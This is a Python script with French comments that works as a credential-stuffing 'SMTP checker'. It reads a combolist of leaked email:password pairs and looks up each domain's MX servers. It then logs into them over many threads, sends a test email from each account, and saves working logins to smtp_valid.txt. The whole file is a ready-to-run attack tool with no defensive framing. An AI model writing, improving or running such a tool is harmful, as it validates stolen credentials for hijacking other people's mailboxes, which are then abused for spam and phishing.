import smtplib
import re
import dns.resolver
from email.mime.text import MIMEText
from typing import Tuple, Optional, List, Dict
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Cache pour les enregistrements MX
MX_CACHE: Dict[str, List[Tuple[str, int]]] = {}
CACHE_LOCK = threading.Lock()

def get_mx_records(domain: str) -> List[Tuple[str, int]]:
    """Récupère les enregistrements MX pour un domaine avec cache."""
    with CACHE_LOCK:
        if domain in MX_CACHE:
            return MX_CACHE[domain]
    
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_records = [(str(answer.exchange), port) for answer in answers for port in [587, 465]]
        with CACHE_LOCK:
            MX_CACHE[domain] = mx_records
        return mx_records
    except Exception as e:
        print(f"Erreur lors de la résolution MX pour {domain}: {str(e)}")
        return []

def check_spf(domain: str) -> bool:
    """Vérifie si le domaine a un enregistrement SPF valide."""
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for answer in answers:
            if 'v=spf1' in str(answer):
                return True
        return False
    except Exception:
        return False

def test_smtp(email: str, password: str, smtp_server: str, smtp_port: int, max_retries: int = 2) -> Tuple[bool, str]:
    """Teste la connexion SMTP et l'envoi d'un email avec retries."""
    for attempt in range(max_retries):
        try:
            # Créer une connexion SMTP
            if smtp_port == 465:
                server = smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10)
            else:
                server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
            
            # Vérifier les capacités du serveur avec EHLO
            server.ehlo()
            if smtp_port == 587:
                if not server.has_extn('STARTTLS'):
                    server.quit()
                    return False, f"STARTTLS non supporté sur {smtp_server}:{smtp_port}"
                server.starttls()
                server.ehlo()
            
            # Vérifier si l'authentification est supportée
            if not server.has_extn('AUTH'):
                server.quit()
                return False, f"AUTH non supporté sur {smtp_server}:{smtp_port}"
            
            # Tenter la connexion
            server.login(email, password)
            
            # Créer un email de test
            msg = MIMEText("Ceci est un email de test envoyé par le script SMTP checker.")
            msg['Subject'] = 'Test SMTP'
            msg['From'] = email
            msg['To'] = email
            
            # Envoyer l'email
            server.send_message(msg)
            server.quit()
            return True, "Connexion et envoi réussis"
        except smtplib.SMTPAuthenticationError:
            return False, f"Échec d'authentification pour {email}"
        except smtplib.SMTPException as e:
            if attempt == max_retries - 1:
                return False, f"Erreur SMTP pour {email}: {str(e)}"
            time.sleep(2 ** attempt)  # Exponential backoff
        except Exception as e:
            if attempt == max_retries - 1:
                return False, f"Erreur générale pour {email}: {str(e)}"
            time.sleep(2 ** attempt)
    return False, "Échec après plusieurs tentatives"

def find_and_test_smtp(email: str, password: str) -> Optional[Tuple[str, int, str]]:
    """Trouve et teste les serveurs SMTP pour un email donné."""
    domain = email.lower().split('@')[-1]
    
    # Vérifier SPF pour confirmer la validité du domaine
    if not check_spf(domain):
        return None, f"Aucun enregistrement SPF valide pour {domain}"
    
    mx_records = get_mx_records(domain)
    if not mx_records:
        return None, f"Aucun enregistrement MX trouvé pour {domain}"
    
    for smtp_server, smtp_port in mx_records:
        print(f"Tentative de connexion pour {email} sur {smtp_server}:{smtp_port}")
        success, message = test_smtp(email, password, smtp_server, smtp_port)
        if success:
            return (smtp_server, smtp_port, message)
        print(message)
        time.sleep(0.5)  # Pause entre les serveurs
    
    return None, f"Aucun serveur SMTP valide pour {email}"

def process_combo(email: str, password: str, results_lock: threading.Lock):
    """Traite une combinaison email:password."""
    if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
        with results_lock:
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"Email invalide: {email}\n")
        return
    
    result, message = find_and_test_smtp(email, password)
    with results_lock:
        if result:
            smtp_server, smtp_port, _ = result
            print(f"SUCCÈS: {email}:{password} - SMTP valide sur {smtp_server}:{smtp_port}")
            with open('smtp_valid.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{smtp_server}:{smtp_port}\n")
        else:
            print(f"ÉCHEC: {email} - {message}")
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{message}\n")

def process_combolist(combo_file: str, max_workers: int = 10):
    """Traite la combolist avec multithreading."""
    try:
        combos = []
        with open(combo_file, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                email, password = line.split(':', 1)
                combos.append((email, password))
        
        results_lock = threading.Lock()
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(process_combo, email, password, results_lock) for email, password in combos]
            for future in as_completed(futures):
                future.result()  # Attendre la fin de chaque tâche
                
    except FileNotFoundError:
        print(f"Fichier {combo_file} non trouvé")
    except Exception as e:
        print(f"Erreur lors du traitement du fichier: {str(e)}")

def main():
    combo_file = input("Entrez le chemin du fichier combolist (mail:pass): ")
    max_workers = int(input("Entrez le nombre de threads (par défaut 10): ") or 10)
    print("Début du traitement de la combolist...")
    process_combolist(combo_file, max_workers)
    print("Traitement terminé. Résultats dans 'smtp_valid.txt' et erreurs dans 'smtp_errors.txt'.")

if __name__ == "__main__":
    main()